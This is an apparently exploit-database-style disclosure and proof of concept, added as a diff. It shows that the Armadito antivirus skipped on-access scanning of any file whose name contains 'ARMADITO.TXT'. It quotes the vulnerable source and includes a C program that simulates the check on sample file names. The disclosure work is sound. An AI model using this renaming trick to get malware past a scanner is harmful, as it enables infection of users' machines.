@@ -1,0 +1,191 @@
+/*
+# Exploit Title : Armadito antimalware - Backdoor/Bypass
+# Date : 07-06-2016 (DD-MM-YYYY)
+# Exploit Author : Ax.
+# Vendor Homepage : http://www.teclib-edition.com/teclib-products/armadito-antivirus/
+# Software Link : https://github.com/41434944/armadito-av
+# Version : No version specified. Fixed 07-06-2016 post-disclosure
+# Tested on : Windows 7
+
+1. Description
+Armadito is an modern antivirus developped by the french company TecLib' (http://www.teclib.com/). Looking at the source code made public few days ago we discovered that there was a backdoor (or a really lack of knowledge from their developpers, meaning that they should reconsider working in security).
+
+2. Proof Of Concept
+As it can be seen in the GitHub repository in the file : armadito-av/core/windows/service/scan_onaccess.c at line 283. An obvious backdoor has been implemented.
+
+[SOURCE]
+			if (msDosFilename == NULL) {
+				a6o_log(ARMADITO_LOG_SERVICE,ARMADITO_LOG_LEVEL_WARNING, " ArmaditoSvc!UserScanWorker :: [%d] :: ConvertDeviceNameToMsDosName failed :: \n",ThreadId);				
+				scan_result = ARMADITO_EINVAL;
+			}
+			else if (strstr(msDosFilename,"ARMADITO.TXT") != NULL) {  // Do not scan the log file. (debug only)
+				scan_result = ARMADITO_WHITE_LISTED;
+			}
+			else {
+
+				// launch a simple file scan
+				//printf("[+] Debug :: UserScanWorker :: [%d] :: a6o_scan :: [%s] \n",ThreadId,msDosFilename);
+				scan_result = a6o_scan_simple(Context->armadito, msDosFilename, &report);
+				a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_DEBUG, "[+] Debug :: UserScanWorker :: [%d] :: %s :: %s\n", ThreadId, msDosFilename, ScanResultToStr(scan_result));
+				printf("[+] Debug :: UserScanWorker :: [%d] :: %s :: %s\n", ThreadId, msDosFilename, ScanResultToStr(scan_result));
+
+			}
+[/SOURCE]
+
+Calling a file ARMADITO.TXT-Malware.exe (or whatever containing ARMADITO.TXT in its name) simply bypass the runtime analysis of the antivirus. You can find attach a small piece of code based on Armadito to reproduce the exploit.
+
+3. Solution
+
+Stop paying developpers that do not know how to deal with security. (Reading the rest of the code has been an exhausting work).
+
+3 bis. Real solution
+
+It seems that they fixed the backdoor already (https://github.com/armadito/armadito-av/blob/DEV/core/windows/service/scan_onaccess.c)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <Windows.h>
+#define BUFSIZE 4096
+#define MAX_PATH_SIZE 255
+#define ARMADITO_EINVAL 0
+#define ARMADITO_WHITE_LISTED 1
+char * ConvertDeviceNameToMsDosName(LPSTR DeviceFileName)
+{
+	char deviceDosName[BUFSIZE];
+	char deviceLetter[3] = { '\0' };
+	char deviceNameQuery[BUFSIZE] = { '\0' };
+	char * deviceDosFilename = NULL;
+	DWORD len = 0;
+	DWORD len2 = 0;
+	DWORD ret = 0;
+	BOOL bFound = FALSE;
+	char * tmp;
+
+	if (DeviceFileName == NULL) {
+		//a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_WARNING, " [-] Error :: ConvertDeviceNameToMsDosName :: invalid parameter DeviceName\n");
+		printf("FileName null.\n");
+		return NULL;
+	}
+
+	// Get the list of the logical drives.
+	len = GetLogicalDriveStringsA(BUFSIZE, deviceDosName);
+	if (len == 0) {
+		//a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_WARNING, "[-] Error :: ConvertDeviceNameToMsDosName!GetLogicalDriveStrings() failed ::  error code = 0x%03d", GetLastError());
+		printf("Error : GetLogicalDriveStringsA()\n");
+		return NULL;
+	}
+
+
+	tmp = deviceDosName;
+
+	do {
+
+		//printf("[+] Debug :: deviceDosName = %s\n",tmp);
+
+		// Get the device letter without the backslash (Ex: C:).
+		memcpy_s(deviceLetter, 2, tmp, 2);
+
+		if (!QueryDosDeviceA(deviceLetter, deviceNameQuery, BUFSIZE)) {
+			//a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_WARNING, "[-] Error :: QueryDosDeviceA() failed ::  error code = 0x%03d\n", GetLastError());
+			printf("Error : QuedryDosDeviceA()\n");
+			return NULL;
+		}
+		
+		//printf("[+] Debug :: DeviceName = %s ==> %s\n",deviceNameQuery,deviceLetter);
+		if (deviceNameQuery == NULL) {
+			//a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_WARNING, "[-] Error :: ConvertDeviceNameToMsDosName :: QueryDosDeviceA() failed ::  deviceNameQuery is NULL\n", GetLastError());
+			printf("deviceNameQuery null.\n");
+		}
+
+		if (deviceNameQuery != NULL && strstr(DeviceFileName, deviceNameQuery) != NULL) {
+			//printf("[+] Debug :: FOUND DeviceName = %s ==> %s\n",deviceNameQuery,deviceLetter);
+
+			len2 = strnlen_s(deviceNameQuery, MAX_PATH_SIZE);
+			len = strnlen_s(DeviceFileName, MAX_PATH_SIZE) - len2 + 3;
+
+			deviceDosFilename = (char*)calloc(len + 1, sizeof(char));
+			deviceDosFilename[len] = '\0';
+
+			memcpy_s(deviceDosFilename, len, tmp, 3);
+			memcpy_s(deviceDosFilename + 2, len, DeviceFileName + len2, len - 1);
+
+			bFound = TRUE;
+
+		}
+
+		// got to the next device name.
+		while (*tmp++);
+		//printf("[+] Debug :: next device name = %s\n",tmp);
+
+
+	} while (bFound == FALSE && *tmp);
+
+
+	if (bFound == FALSE) {
+		return NULL;
+	}
+
+	return deviceDosFilename;
+}
+
+
+int main(int argc, char ** argv)
+{
+	char * msDosFilename = NULL;
+	int i = 0;
+	LPSTR ArmaditoFile = "\\Device\\HarddiskVolume2\\ARMADITO.TXT"; /* Converted, this is C:\\ARMADITO.txt */
+	LPSTR BinaryFile = "\\Device\\HarddiskVolume2\\Malware.exe"; /* Converted, this is C:\\malware.exe */
+	LPSTR BinaryPOCFile = "\\Device\\HarddiskVolume2\\ARMADITO.TXT-ILoveJeromeNotin.exe"; /* Converted, this is C:\\ARMADITO.txt-ILoveJeromeNotin.exe */
+	char *string;
+	int scan_result = -1;
+	
+	/* Armadito get the filename from message->msg.FileName ; We remplaced it using a simple string*/
+	// msDosFilename = ConvertDeviceNameToMsDosName(message->msg.FileName);
+	for (i = 0; i < 3; i++)
+	{
+		if (i == 0)
+		{
+			printf("Scanning C:\\ARMADITO.txt\n");
+			msDosFilename = ConvertDeviceNameToMsDosName(ArmaditoFile);
+		}
+		else if (i == 1)
+		{
+			printf("Scanning C:\\malware.exe\n");
+			msDosFilename = ConvertDeviceNameToMsDosName(BinaryFile);
+		}
+		else
+		{
+			printf("Scanning C:\\ARMADITO.txt-ILoveJeromeNotin.exe\n");
+			msDosFilename = ConvertDeviceNameToMsDosName(BinaryPOCFile);
+		}
+		//report.status = ARMADITO_CLEAN;
+		/* If the ConvertDeviceNametoMsDosName fails */
+		if (msDosFilename == NULL) {
+			//a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_WARNING, " ArmaditoSvc!UserScanWorker :: [%d] :: ConvertDeviceNameToMsDosName failed :: \n", ThreadId);
+			scan_result = ARMADITO_EINVAL;
+		}
+		/* If it contains ARMADITO.TXT ... SERIOUSLY ? */
+		
+		else if (strstr(msDosFilename, "ARMADITO.TXT") != NULL) {  // Do not scan the log file. (debug only)
+			scan_result = ARMADITO_WHITE_LISTED;
+			printf("This file is not suspicious. Since it contains ARMADITO.txt ........... \n");
+		}
+		else {
+			/* Armadito basic scan */
+			printf("Armadito will now scan the file.\n");
+			// launch a simple file scan
+			//printf("[+] Debug :: UserScanWorker :: [%d] :: a6o_scan :: [%s] \n",ThreadId,msDosFilename);
+			//scan_result = a6o_scan_simple(Context->armadito, msDosFilename, &report);
+			//a6o_log(ARMADITO_LOG_SERVICE, ARMADITO_LOG_LEVEL_DEBUG, "[+] Debug :: UserScanWorker :: [%d] :: %s :: %s\n", ThreadId, msDosFilename, ScanResultToStr(scan_result));
+			//printf("[+] Debug :: UserScanWorker :: [%d] :: %s :: %s\n", ThreadId, msDosFilename, ScanResultToStr(scan_result));
+
+		}
+
+		printf("\n\n");
+	}
+
+
+	getchar();
+	return 0;
+}
